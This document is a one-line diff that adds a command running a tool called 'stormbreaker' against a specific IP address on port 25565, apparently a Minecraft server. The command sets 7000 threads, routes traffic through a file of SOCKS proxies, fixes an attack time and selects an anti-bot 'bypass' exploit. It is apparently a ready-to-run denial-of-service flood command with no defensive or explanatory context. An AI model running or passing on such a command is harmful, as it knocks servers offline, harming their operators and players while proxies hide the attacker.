@@ -1,0 +1,1 @@
+java -jar stormbreaker-1.0-SNAPSHOT.jar host=87.98.136.42 port=25565 srvResolve=true srvResolve2=false alwaysResolve=false threads=7000 connections=100 multi=false removeFailure=true socksV4=true loopAmount=1000 timeout=2500 keepAlive=false proxiesType=socks print=true proxiesFile=socks.txt attackTime=100 exploit=yooniksbypass2
